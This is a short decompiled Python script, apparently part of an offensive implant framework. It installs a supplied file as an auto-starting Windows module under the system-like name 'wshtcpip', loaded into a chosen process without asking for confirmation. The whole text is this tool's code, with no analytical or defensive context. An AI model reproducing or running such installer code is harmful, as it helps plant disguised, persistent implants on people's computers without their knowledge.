# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.0b2 (default, Oct 11 2016, 05:27:10) 
# [GCC 6.2.0 20161005]
# Embedded file name: _Install.py
import dsz
import dsz.lp
dsz.lp.AddResDirToPath('DeMi')
import demi
import demi.registry
import demi.windows.module
import glob
import os
import re
import shutil
import sys

def main():
    dsz.control.echo.Off()
    if len(sys.argv) != 3:
        dsz.ui.Echo('* Invalid parameters', dsz.ERROR)
        dsz.ui.Echo()
        dsz.ui.Echo('Usage:  %s <localFile> <procName>' % sys.argv[0])
        return False
    localFile = sys.argv[1]
    procName = sys.argv[2]
    return demi.windows.module.Install('Pc', localFile, 'wshtcpip', demi.registry.PC.Id, 1, 'Auto_Start|User_Mode', procName, ask=False)


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)